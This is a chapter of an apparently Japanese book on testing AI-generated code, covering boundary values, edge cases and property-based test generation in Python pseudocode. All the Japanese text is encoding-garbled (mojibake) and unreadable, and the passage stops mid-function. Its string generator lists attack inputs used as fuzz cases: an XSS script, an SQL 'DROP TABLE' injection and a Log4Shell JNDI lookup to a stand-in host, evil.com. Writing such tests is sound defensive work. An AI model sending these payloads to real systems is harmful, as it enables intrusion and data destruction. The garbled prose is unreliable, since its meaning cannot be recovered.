---
layout: book
title: "ç¬¬5ç«  AIã‚³ãƒ¼ãƒ‰æ¤œè¨¼ã®å®Ÿè·µæŠ€æ³•"
---

# ç¬¬5ç«  AIã‚³ãƒ¼ãƒ‰æ¤œè¨¼ã®å®Ÿè·µæŠ€æ³•

> **æ³¨è¨˜**  
> æœ¬ç« ä¸­ã®ã‚³ãƒ¼ãƒ‰ãƒ–ãƒ­ãƒƒã‚¯ã¯ã€æ¦‚å¿µèª¬æ˜ã®ãŸã‚ã«ä¸€éƒ¨ã‚’çœç•¥ã—ãŸæ“¬ä¼¼ã‚³ãƒ¼ãƒ‰ï¼ˆPseudo codeï¼‰ã‚’å«ã‚€ã€‚å‹•ä½œã™ã‚‹æœ€å°ã‚µãƒ³ãƒ—ãƒ«ã¯ `examples/` ã‚’å‚ç…§ã—ã¦ã»ã—ã„ã€‚

## ã¯ã˜ã‚ã«ï¼šãªãœAIç‰¹æœ‰ã®æ¤œè¨¼æŠ€æ³•ãŒå¿…è¦ãªã®ã‹

ã€Œæ‚ªé­”ã¯ç´°éƒ¨ã«å®¿ã‚‹ã€ã¨ã„ã†è¨€è‘‰ãŒã‚ã‚‹ãŒã€AIãŒç”Ÿæˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã«ãŠã„ã¦ã¯ã€ã“ã®è¨€è‘‰ãŒã‚ˆã‚Šä¸€å±¤ã®é‡ã¿ã‚’æŒã¤ã€‚AIã¯è¡¨é¢çš„ã«ã¯æ­£ã—ãå‹•ä½œã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã§ãã‚‹ãŒã€ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¨ã„ã£ãŸã€Œç´°éƒ¨ã€ã«ãŠã„ã¦é‡å¤§ãªå•é¡Œã‚’æŠ±ãˆã¦ã„ã‚‹ã“ã¨ãŒå¤šã„ã€‚

æœ¬ç« ã§ã¯ã€AIã‚³ãƒ¼ãƒ‰ã®å¼±ç‚¹ã‚’ä½“ç³»çš„ã«æ¤œè¨¼ã™ã‚‹å®Ÿè·µçš„ãªæŠ€æ³•ã‚’æ¢æ±‚ã™ã‚‹ã€‚ã“ã‚Œã‚‰ã®æŠ€æ³•ã¯ã€å˜ã«ãƒã‚°ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã¯ãªã„ã€‚AIã®æ€è€ƒãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’ç†è§£ã—ã€ãã®ç›²ç‚¹ã‚’è£œå®Œã™ã‚‹ã“ã¨ã§ã€çœŸã«ä¿¡é ¼ã§ãã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã®æ–¹æ³•è«–ã§ã‚ã‚‹ã€‚

é‡è¦ãªã®ã¯ã€ã“ã‚Œã‚‰ã®æŠ€æ³•ãŒã€Œãªãœå¿…è¦ã‹ã€ã‚’ç†è§£ã™ã‚‹ã“ã¨ã§ã‚ã‚‹ã€‚AIã®é™ç•Œã‚’çŸ¥ã‚‹ã“ã¨ã§ã€æˆ‘ã€…ã¯ã‚ˆã‚ŠåŠ¹æœçš„ãªæ¤œè¨¼æˆ¦ç•¥ã‚’ç«‹æ¡ˆã—ã€é™ã‚‰ã‚ŒãŸãƒªã‚½ãƒ¼ã‚¹ã§æœ€å¤§ã®å“è³ªå‘ä¸Šã‚’å®Ÿç¾ã§ãã‚‹ã€‚

## 5.1 å¢ƒç•Œå€¤ãƒ»ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã®ç‰¹å®š

### 5.1.1 AIã®ç›²ç‚¹ã¨ãªã‚Šã‚„ã™ã„ãƒ‘ã‚¿ãƒ¼ãƒ³

**ãªãœAIã¯å¢ƒç•Œå€¤ã‚’è¦‹é€ƒã—ã‚„ã™ã„ã®ã‹**

AIã¯å­¦ç¿’ãƒ‡ãƒ¼ã‚¿ã®ã€Œä¸­å¿ƒçš„ãªã€ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’å­¦ç¿’ã™ã‚‹ã“ã¨ã«å„ªã‚Œã¦ã„ã‚‹ãŒã€çµ±è¨ˆçš„ã«ç¨€ãªã‚±ãƒ¼ã‚¹ã‚„ã€è«–ç†çš„æ¨è«–ã‚’è¦ã™ã‚‹å¢ƒç•Œæ¡ä»¶ã®æ‰±ã„ã¯è‹¦æ‰‹ã«ãªã‚Šã‚„ã™ã„ã€‚ã“ã‚Œã¯ã€AIãŒã€Œæœ€ã‚‚å¯èƒ½æ€§ã®é«˜ã„ã€ã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã‚ˆã†ã«è¨“ç·´ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã§ã‚ã‚‹ã€‚

**AIãŒè¦‹é€ƒã—ã‚„ã™ã„å¢ƒç•Œå€¤ãƒ‘ã‚¿ãƒ¼ãƒ³ã®åˆ†é¡**

```python
class AIBlindSpotAnalyzer:
    """AIã®ç›²ç‚¹ã¨ãªã‚Šã‚„ã™ã„ãƒ‘ã‚¿ãƒ¼ãƒ³ã®åˆ†æå™¨"""
    
    def __init__(self):
        self.blind_spot_patterns = self._initialize_patterns()
        self.detection_strategies = self._initialize_strategies()
    
    def _initialize_patterns(self) -> Dict[str, BlindSpotPattern]:
        """AIãŒè¦‹é€ƒã—ã‚„ã™ã„ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ã‚«ã‚¿ãƒ­ã‚°"""
        
        return {
            "numeric_overflow": BlindSpotPattern(
                name="æ•°å€¤ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼",
                description="æ•´æ•°ã‚„æµ®å‹•å°æ•°ç‚¹æ•°ã®é™ç•Œå€¤",
                why_ai_misses="å­¦ç¿’ãƒ‡ãƒ¼ã‚¿ã«æ¥µç«¯ãªå€¤ãŒå°‘ãªã„",
                examples=[
                    "32ãƒ“ãƒƒãƒˆæ•´æ•°ã®æœ€å¤§å€¤ä»˜è¿‘ã®æ¼”ç®—",
                    "æµ®å‹•å°æ•°ç‚¹æ•°ã®ç²¾åº¦é™ç•Œ",
                    "ã‚¢ãƒ³ãƒ€ãƒ¼ãƒ•ãƒ­ãƒ¼ã¨ã‚µã‚¤ãƒ¬ãƒ³ãƒˆã‚¨ãƒ©ãƒ¼"
                ],
                detection_strategy=self._detect_numeric_overflow
            ),
            
            "empty_collections": BlindSpotPattern(
                name="ç©ºã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³",
                description="ç©ºé…åˆ—ã€ç©ºæ–‡å­—åˆ—ã€nullã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³",
                why_ai_misses="'é€šå¸¸'ã®ã‚±ãƒ¼ã‚¹ã«åã£ãŸå­¦ç¿’",
                examples=[
                    "ç©ºé…åˆ—ã§ã®é›†ç´„é–¢æ•°ï¼ˆsum, averageï¼‰",
                    "ç©ºæ–‡å­—åˆ—ã®ãƒ‘ãƒ¼ã‚¹å‡¦ç†",
                    "nullã¨ç©ºé…åˆ—ã®åŒºåˆ¥"
                ],
                detection_strategy=self._detect_empty_collection_issues
            ),
            
            "boundary_conditions": BlindSpotPattern(
                name="å¢ƒç•Œæ¡ä»¶",
                description="ç¯„å›²ã®ç«¯ã§ã®å‹•ä½œ",
                why_ai_misses="ä¸ç­‰å·ã®æ‰±ã„ã®æ›–æ˜§ã•",
                examples=[
                    "é…åˆ—ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã®å¢ƒç•Œ",
                    "æ—¥ä»˜ã®æœˆæœ«ãƒ»å¹´æœ«å‡¦ç†",
                    "ãƒšãƒ¼ã‚¸ãƒãƒ¼ã‚·ãƒ§ãƒ³ã®æœ€çµ‚ãƒšãƒ¼ã‚¸"
                ],
                detection_strategy=self._detect_boundary_conditions
            ),
            
            "concurrent_edge_cases": BlindSpotPattern(
                name="ä¸¦è¡Œå‡¦ç†ã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹",
                description="åŒæ™‚å®Ÿè¡Œæ™‚ã®ç«¶åˆçŠ¶æ…‹",
                why_ai_misses="å˜ä¸€ã‚¹ãƒ¬ãƒƒãƒ‰ã®æ–‡è„ˆã§å­¦ç¿’",
                examples=[
                    "è¤‡æ•°ã‚¹ãƒ¬ãƒƒãƒ‰ã‹ã‚‰ã®åŒæ™‚æ›´æ–°",
                    "ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯æ¡ä»¶",
                    "èª­ã¿æ›¸ãã®é †åºä¾å­˜"
                ],
                detection_strategy=self._detect_concurrency_issues
            ),
            
            "encoding_issues": BlindSpotPattern(
                name="ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°å•é¡Œ",
                description="æ–‡å­—ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®å¢ƒç•Œ",
                why_ai_misses="ASCIIä¸­å¿ƒã®å­¦ç¿’ãƒ‡ãƒ¼ã‚¿",
                examples=[
                    "ãƒãƒ«ãƒãƒã‚¤ãƒˆæ–‡å­—ã®åˆ†å‰²",
                    "ã‚µãƒ­ã‚²ãƒ¼ãƒˆãƒšã‚¢ã®å‡¦ç†",
                    "ç•°ãªã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°é–“ã®å¤‰æ›"
                ],
                detection_strategy=self._detect_encoding_issues
            )
        }
    
    def analyze_code_for_blind_spots(
        self,
        code: str,
        context: CodeContext
    ) -> List[BlindSpotWarning]:
        """ã‚³ãƒ¼ãƒ‰ã®AIç›²ç‚¹åˆ†æ"""
        
        warnings = []
        ast_tree = self._parse_code(code)
        
        for pattern_name, pattern in self.blind_spot_patterns.items():
            # ãƒ‘ã‚¿ãƒ¼ãƒ³å›ºæœ‰ã®æ¤œå‡ºæˆ¦ç•¥ã‚’å®Ÿè¡Œ
            detected_issues = pattern.detection_strategy(
                ast_tree,
                context
            )
            
            for issue in detected_issues:
                warning = BlindSpotWarning(
                    pattern=pattern,
                    location=issue.location,
                    severity=self._assess_severity(issue, context),
                    explanation=self._generate_explanation(pattern, issue),
                    test_cases=self._generate_test_cases(pattern, issue)
                )
                warnings.append(warning)
        
        return warnings
```

**å…·ä½“çš„ãªç›²ç‚¹ãƒ‘ã‚¿ãƒ¼ãƒ³ã®è©³ç´°åˆ†æ**

```python
class NumericBoundaryAnalyzer:
    """æ•°å€¤å¢ƒç•Œã®è©³ç´°åˆ†æ"""
    
    def analyze_numeric_operations(self, code_ast: AST) -> List[Issue]:
        """æ•°å€¤æ¼”ç®—ã®å¢ƒç•Œå€¤å•é¡Œã‚’æ¤œå‡º"""
        
        issues = []
        
        for node in ast.walk(code_ast):
            if isinstance(node, ast.BinOp):
                # æ•´æ•°ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®å¯èƒ½æ€§
                if self._can_overflow(node):
                    issues.append(Issue(
                        type="potential_overflow",
                        node=node,
                        description="æ•´æ•°æ¼”ç®—ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®å¯èƒ½æ€§",
                        example_input=self._generate_overflow_input(node),
                        fix_suggestion=self._suggest_overflow_fix(node)
                    ))
                
                # æµ®å‹•å°æ•°ç‚¹ã®ç²¾åº¦å•é¡Œ
                if self._has_precision_issue(node):
                    issues.append(Issue(
                        type="float_precision",
                        node=node,
                        description="æµ®å‹•å°æ•°ç‚¹æ•°ã®ç²¾åº¦å•é¡Œ",
                        example_case=self._demonstrate_precision_loss(node)
                    ))
            
            # ã‚¼ãƒ­é™¤ç®—ã®å¯èƒ½æ€§
            if isinstance(node, ast.Div):
                if not self._has_zero_check(node):
                    issues.append(Issue(
                        type="potential_zero_division",
                        node=node,
                        description="ã‚¼ãƒ­é™¤ç®—ã®å¯èƒ½æ€§",
                        test_case=self._create_zero_division_test(node)
                    ))
        
        return issues
    
    def _can_overflow(self, node: ast.BinOp) -> bool:
        """ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®å¯èƒ½æ€§ã‚’åˆ¤å®š"""
        
        # åŠ ç®—ãƒ»ä¹—ç®—ã§ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼å¯èƒ½æ€§
        if isinstance(node.op, (ast.Add, ast.Mult)):
            # å¤‰æ•°ã®å‹æƒ…å ±ã‚’æ¨è«–
            left_type = self._infer_type(node.left)
            right_type = self._infer_type(node.right)
            
            # ä¸¡æ–¹ãŒæ•´æ•°å‹ã®å ´åˆ
            if left_type == 'int' and right_type == 'int':
                # å¢ƒç•Œå€¤ã¨ã®æ¼”ç®—ã‚’ãƒã‚§ãƒƒã‚¯
                return True
        
        return False
    
    def _demonstrate_precision_loss(self, node: ast.BinOp) -> str:
        """ç²¾åº¦æå¤±ã®å®Ÿä¾‹ã‚’ç”Ÿæˆ"""
        
        return f"""
        # ç²¾åº¦æå¤±ã®ä¾‹
        a = 0.1
        b = 0.2
        result = a + b  # 0.30000000000000004 (æœŸå¾…å€¤: 0.3)
        
        # é‡‘é¡è¨ˆç®—ã§ã®å•é¡Œ
        price = 19.99
        tax = 0.08
        total = price * (1 + tax)  # 21.589200000000002
        """
```

### 5.1.2 ã‚·ã‚¹ãƒ†ãƒãƒ†ã‚£ãƒƒã‚¯ãªå¢ƒç•Œå€¤æ¢ç´¢

**ä½“ç³»çš„ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã®é‡è¦æ€§**

å¢ƒç•Œå€¤ã®æ¢ç´¢ã‚’å‹˜ã«é ¼ã£ã¦è¡Œã†ã®ã¯éåŠ¹ç‡çš„ã§ã‚ã‚‹ã€‚ã‚·ã‚¹ãƒ†ãƒãƒ†ã‚£ãƒƒã‚¯ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã«ã‚ˆã‚Šã€é‡è¦ãªå¢ƒç•Œå€¤ã‚’æ¼ã‚Œãªãã€åŠ¹ç‡çš„ã«ç‰¹å®šã§ãã‚‹ã€‚

**å¢ƒç•Œå€¤æ¢ç´¢ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯**

```python
class SystematicBoundaryExplorer:
    """ä½“ç³»çš„ãªå¢ƒç•Œå€¤æ¢ç´¢ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯"""
    
    def __init__(self):
        self.boundary_categories = self._define_categories()
        self.exploration_strategies = self._define_strategies()
    
    def explore_boundaries(
        self,
        function: Callable,
        parameter_specs: List[ParameterSpec]
    ) -> BoundaryTestSuite:
        """é–¢æ•°ã®å¢ƒç•Œå€¤ã‚’ä½“ç³»çš„ã«æ¢ç´¢"""
        
        test_suite = BoundaryTestSuite()
        
        # å˜ä¸€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å¢ƒç•Œå€¤
        for param_spec in parameter_specs:
            single_boundaries = self._explore_single_parameter(
                function,
                param_spec
            )
            test_suite.add_tests(single_boundaries)
        
        # ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿é–“ã®ç›¸äº’ä½œç”¨å¢ƒç•Œå€¤
        if len(parameter_specs) > 1:
            interaction_boundaries = self._explore_interactions(
                function,
                parameter_specs
            )
            test_suite.add_tests(interaction_boundaries)
        
        # ãƒ‰ãƒ¡ã‚¤ãƒ³å›ºæœ‰ã®å¢ƒç•Œå€¤
        domain_boundaries = self._explore_domain_specific(
            function,
            parameter_specs
        )
        test_suite.add_tests(domain_boundaries)
        
        return test_suite
    
    def _explore_single_parameter(
        self,
        function: Callable,
        param_spec: ParameterSpec
    ) -> List[BoundaryTest]:
        """å˜ä¸€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®å¢ƒç•Œå€¤æ¢ç´¢"""
        
        tests = []
        
        if param_spec.type == 'numeric':
            tests.extend(self._numeric_boundaries(param_spec))
        elif param_spec.type == 'string':
            tests.extend(self._string_boundaries(param_spec))
        elif param_spec.type == 'collection':
            tests.extend(self._collection_boundaries(param_spec))
        elif param_spec.type == 'datetime':
            tests.extend(self._datetime_boundaries(param_spec))
        
        return tests
    
    def _numeric_boundaries(self, spec: ParameterSpec) -> List[BoundaryTest]:
        """æ•°å€¤å‹ã®å¢ƒç•Œå€¤ç”Ÿæˆ"""
        
        boundaries = []
        
        # åŸºæœ¬çš„ãªå¢ƒç•Œå€¤
        base_values = [
            spec.min_value,
            spec.min_value - 1,
            spec.min_value + 1,
            spec.max_value,
            spec.max_value - 1,
            spec.max_value + 1,
            0,  # ã‚¼ãƒ­ã¯å¸¸ã«é‡è¦
            -1, 1  # ç¬¦å·ã®å¢ƒç•Œ
        ]
        
        # å‹å›ºæœ‰ã®å¢ƒç•Œå€¤
        if spec.subtype == 'integer':
            boundaries.extend([
                2**31 - 1,  # 32ãƒ“ãƒƒãƒˆæ•´æ•°ã®æœ€å¤§å€¤
                -2**31,     # 32ãƒ“ãƒƒãƒˆæ•´æ•°ã®æœ€å°å€¤
                2**63 - 1,  # 64ãƒ“ãƒƒãƒˆæ•´æ•°ã®æœ€å¤§å€¤
                -2**63      # 64ãƒ“ãƒƒãƒˆæ•´æ•°ã®æœ€å°å€¤
            ])
        elif spec.subtype == 'float':
            boundaries.extend([
                float('inf'),
                float('-inf'),
                float('nan'),
                sys.float_info.max,
                sys.float_info.min,
                sys.float_info.epsilon
            ])
        
        # å„å¢ƒç•Œå€¤ã«å¯¾ã™ã‚‹ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ç”Ÿæˆ
        for value in base_values:
            if self._is_valid_boundary(value, spec):
                test = BoundaryTest(
                    name=f"test_{spec.name}_boundary_{value}",
                    parameter=spec.name,
                    value=value,
                    expected_behavior=self._predict_behavior(spec, value),
                    rationale=self._explain_boundary_importance(spec, value)
                )
                boundaries.append(test)
        
        return boundaries
    
    def _explore_interactions(
        self,
        function: Callable,
        param_specs: List[ParameterSpec]
    ) -> List[BoundaryTest]:
        """ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿é–“ã®ç›¸äº’ä½œç”¨ã«ã‚ˆã‚‹å¢ƒç•Œå€¤æ¢ç´¢"""
        
        interaction_tests = []
        
        # ãƒšã‚¢ãƒ¯ã‚¤ã‚ºç›¸äº’ä½œç”¨
        for i, spec1 in enumerate(param_specs):
            for spec2 in param_specs[i+1:]:
                # ç›¸äº’ã«å½±éŸ¿ã—åˆã†å¯èƒ½æ€§ã®ã‚ã‚‹çµ„ã¿åˆã‚ã›
                if self._can_interact(spec1, spec2):
                    combinations = self._generate_interaction_boundaries(
                        spec1,
                        spec2
                    )
                    
                    for combo in combinations:
                        test = BoundaryTest(
                            name=f"test_interaction_{spec1.name}_{spec2.name}",
                            parameters={
                                spec1.name: combo[0],
                                spec2.name: combo[1]
                            },
                            expected_behavior=self._predict_interaction_behavior(
                                spec1, spec2, combo
                            ),
                            rationale=f"ç›¸äº’ä½œç”¨å¢ƒç•Œ: {combo[2]}"
                        )
                        interaction_tests.append(test)
        
        return interaction_tests
```

**å®Ÿè·µçš„ãªå¢ƒç•Œå€¤æ¢ç´¢ã®ä¾‹**

```python
class PracticalBoundaryExamples:
    """å®Ÿè·µçš„ãªå¢ƒç•Œå€¤æ¢ç´¢ã®å…·ä½“ä¾‹"""
    
    def explore_pagination_boundaries(
        self,
        pagination_function: Callable
    ) -> List[TestCase]:
        """ãƒšãƒ¼ã‚¸ãƒãƒ¼ã‚·ãƒ§ãƒ³æ©Ÿèƒ½ã®å¢ƒç•Œå€¤æ¢ç´¢"""
        
        test_cases = []
        
        # åŸºæœ¬çš„ãªå¢ƒç•Œå€¤
        basic_cases = [
            {"page": 0, "per_page": 10, "expect": "error_or_first_page"},
            {"page": 1, "per_page": 0, "expect": "error"},
            {"page": 1, "per_page": -1, "expect": "error"},
            {"page": -1, "per_page": 10, "expect": "error"},
            {"page": 1, "per_page": 1, "expect": "single_item"},
            {"page": sys.maxsize, "per_page": 10, "expect": "empty_or_error"}
        ]
        
        # ãƒ‡ãƒ¼ã‚¿ä¾å­˜ã®å¢ƒç•Œå€¤
        total_items = 95  # ä¾‹ï¼šå…¨ãƒ‡ãƒ¼ã‚¿æ•°
        
        data_dependent_cases = [
            # æœ€çµ‚ãƒšãƒ¼ã‚¸ã®å¢ƒç•Œ
            {"page": 9, "per_page": 10, "expect": "full_page"},
            {"page": 10, "per_page": 10, "expect": "partial_page_5_items"},
            {"page": 11, "per_page": 10, "expect": "empty"},
            
            # per_pageãŒå…¨ãƒ‡ãƒ¼ã‚¿æ•°ã‚’è¶…ãˆã‚‹
            {"page": 1, "per_page": 100, "expect": "all_items"},
            {"page": 2, "per_page": 100, "expect": "empty"},
            
            # å¢ƒç•Œã§ã®åˆ‡ã‚Šæ›¿ã‚ã‚Š
            {"page": 1, "per_page": 95, "expect": "all_items"},
            {"page": 1, "per_page": 96, "expect": "all_items"}
        ]
        
        # æ€§èƒ½ã®å¢ƒç•Œå€¤
        performance_cases = [
            {"page": 1, "per_page": 10000, "expect": "performance_degradation"},
            {"page": 10000, "per_page": 1, "expect": "deep_pagination_issue"}
        ]
        
        # å„ã‚±ãƒ¼ã‚¹ã‚’ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¤‰æ›
        for case in basic_cases + data_dependent_cases + performance_cases:
            test = TestCase(
                name=f"test_pagination_{case['page']}_{case['per_page']}",
                inputs={"page": case['page'], "per_page": case['per_page']},
                expected=case['expect'],
                category="boundary_value",
                priority=self._calculate_priority(case)
            )
            test_cases.append(test)
        
        return test_cases
    
    def explore_date_boundaries(self, date_function: Callable) -> List[TestCase]:
        """æ—¥ä»˜å‡¦ç†ã®å¢ƒç•Œå€¤æ¢ç´¢"""
        
        test_cases = []
        
        # æš¦ã®å¢ƒç•Œå€¤
        calendar_boundaries = [
            # æœˆæœ«
            datetime(2024, 1, 31),   # 31æ—¥ã®æœˆ
            datetime(2024, 2, 29),   # ã†ã‚‹ã†å¹´ã®2æœˆ
            datetime(2023, 2, 28),   # å¹³å¹´ã®2æœˆ
            datetime(2024, 4, 30),   # 30æ—¥ã®æœˆ
            
            # å¹´ã®å¢ƒç•Œ
            datetime(2023, 12, 31, 23, 59, 59),
            datetime(2024, 1, 1, 0, 0, 0),
            
            # ç‰¹æ®Šãªæ—¥ä»˜
            datetime(2000, 2, 29),   # 400å¹´ã”ã¨ã®ã†ã‚‹ã†å¹´
            datetime(1900, 2, 28),   # 100å¹´ã”ã¨ã®å¹³å¹´
            
            # ã‚¿ã‚¤ãƒ ã‚¾ãƒ¼ãƒ³åˆ‡ã‚Šæ›¿ã‚ã‚Šï¼ˆå¤æ™‚é–“ï¼‰
            # â€»åœ°åŸŸã«ã‚ˆã‚Šç•°ãªã‚‹
        ]
        
        # ã‚¨ãƒãƒƒã‚¯é–¢é€£
        epoch_boundaries = [
            datetime(1970, 1, 1),    # Unixã‚¨ãƒãƒƒã‚¯
            datetime(2038, 1, 19, 3, 14, 7),  # 32ãƒ“ãƒƒãƒˆã‚¿ã‚¤ãƒ ã‚¹ã‚¿ãƒ³ãƒ—é™ç•Œ
            datetime(1900, 1, 1),    # Excelã‚¨ãƒãƒƒã‚¯
            datetime(1601, 1, 1),    # Windowsã‚¨ãƒãƒƒã‚¯
        ]
        
        # ç›¸å¯¾æ—¥ä»˜ã®å¢ƒç•Œ
        relative_boundaries = [
            # æœˆã®åŠ ç®—ãƒ»æ¸›ç®—
            (datetime(2024, 1, 31), "add_months", 1),  # 1/31 + 1ãƒ¶æœˆ = 2/29?
            (datetime(2024, 3, 31), "subtract_months", 1),  # 3/31 - 1ãƒ¶æœˆ = 2/29?
            
            # å¹´ã®åŠ ç®—ãƒ»æ¸›ç®—ï¼ˆã†ã‚‹ã†å¹´è€ƒæ…®ï¼‰
            (datetime(2024, 2, 29), "add_years", 1),  # 2/29 + 1å¹´ = 2/28?
        ]
        
        return test_cases
```

### 5.1.3 ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹è‡ªå‹•ç”Ÿæˆæ‰‹æ³•

**è‡ªå‹•ç”Ÿæˆã®å¨åŠ›ã¨èª²é¡Œ**

ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã®æ‰‹å‹•åˆ—æŒ™ã«ã¯é™ç•ŒãŒã‚ã‚‹ã€‚è‡ªå‹•ç”Ÿæˆã«ã‚ˆã‚Šã€äººé–“ãŒæ€ã„ã¤ã‹ãªã„ã‚±ãƒ¼ã‚¹ã‚‚ç¶²ç¾…çš„ã«ãƒ†ã‚¹ãƒˆã§ãã‚‹ã€‚ã—ã‹ã—ã€æ„å‘³ã®ã‚ã‚‹ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã‚’ç”Ÿæˆã™ã‚‹ã«ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³çŸ¥è­˜ã‚’çµ„ã¿è¾¼ã‚“ã ã‚¤ãƒ³ãƒ†ãƒªã‚¸ã‚§ãƒ³ãƒˆãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒå¿…è¦ã§ã‚ã‚‹ã€‚

**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãƒ™ãƒ¼ã‚¹ãƒ†ã‚¹ãƒˆã«ã‚ˆã‚‹ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ**

```python
class PropertyBasedEdgeCaseGenerator:
    """ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãƒ™ãƒ¼ã‚¹ãƒ†ã‚¹ãƒˆã«ã‚ˆã‚‹ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ"""
    
    def __init__(self):
        self.generators = self._initialize_generators()
        self.shrinkers = self._initialize_shrinkers()
    
    def generate_edge_cases(
        self,
        function: Callable,
        properties: List[Property]
    ) -> List[EdgeCase]:
        """ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æº€ãŸã•ãªã„ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã‚’è‡ªå‹•ç”Ÿæˆ"""
        
        edge_cases = []
        
        for property in properties:
            # ãƒ©ãƒ³ãƒ€ãƒ ãªå…¥åŠ›ç”Ÿæˆ
            for _ in range(1000):  # è©¦è¡Œå›æ•°
                inputs = self._generate_inputs(property.input_spec)
                
                try:
                    result = function(**inputs)
                    
                    # ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£é•åã‚’ãƒã‚§ãƒƒã‚¯
                    if not property.check(inputs, result):
                        # æœ€å°åŒ–ï¼ˆã‚·ãƒ¥ãƒªãƒ³ã‚¯ï¼‰
                        minimal_case = self._shrink_input(
                            function,
                            property,
                            inputs
                        )
                        
                        edge_case = EdgeCase(
                            inputs=minimal_case,
                            property_violated=property,
                            explanation=self._explain_violation(
                                property,
                                minimal_case,
                                result
                            )
                        )
                        edge_cases.append(edge_case)
                        
                except Exception as e:
                    # ã‚¨ãƒ©ãƒ¼ã‚‚ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã¨ã—ã¦è¨˜éŒ²
                    edge_case = EdgeCase(
                        inputs=inputs,
                        error=e,
                        property_violated=property
                    )
                    edge_cases.append(edge_case)
        
        return edge_cases
    
    def _generate_inputs(self, spec: InputSpec) -> Dict[str, Any]:
        """ä»•æ§˜ã«åŸºã¥ãå…¥åŠ›ç”Ÿæˆ"""
        
        inputs = {}
        
        for param_name, param_spec in spec.parameters.items():
            if param_spec.type == 'string':
                inputs[param_name] = self._generate_string(param_spec)
            elif param_spec.type == 'number':
                inputs[param_name] = self._generate_number(param_spec)
            elif param_spec.type == 'array':
                inputs[param_name] = self._generate_array(param_spec)
            elif param_spec.type == 'object':
                inputs[param_name] = self._generate_object(param_spec)
        
        return inputs
    
    def _generate_string(self, spec: StringSpec) -> str:
        """æ–‡å­—åˆ—ã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ç”Ÿæˆ"""
        
        strategies = [
            # ç©ºãƒ»ç©ºç™½
            lambda: "",
            lambda: " " * random.randint(1, 100),
            
            # é•·ã•ã®å¢ƒç•Œ
            lambda: "a" * spec.min_length if spec.min_length else "",
            lambda: "a" * spec.max_length if spec.max_length else "a" * 10000,
            
            # ç‰¹æ®Šæ–‡å­—
            lambda: "\n\r\t\0",
            lambda: "".join(chr(i) for i in range(0, 32)),  # åˆ¶å¾¡æ–‡å­—
            
            # Unicode
            lambda: "ğŸŒğŸğŸğŸ",  # çµµæ–‡å­—
            lambda: "\ud800",  # ä¸æ­£ãªUnicodeï¼ˆä¸æ­£ãªã‚µãƒ­ã‚²ãƒ¼ãƒˆï¼‰
            
            # ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
            lambda: "<script>alert('xss')</script>",
            lambda: "'; DROP TABLE users; --",
            lambda: "${jndi:ldap://evil.com/a}",  # Log4Shell
            
            # ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—
            lambda: "%s%s%s%s%s%s%s%s%s%s",
            lambda: "{0}{1}{2}{3}{4}{5}",
        ]
        
        # ãƒ©ãƒ³ãƒ€ãƒ ã«æˆ¦ç•¥ã‚’é¸æŠ
        strategy = random.choice(strategies)
        return strategy()
    
    def _shrink_input(
        self,
        function: Callable,
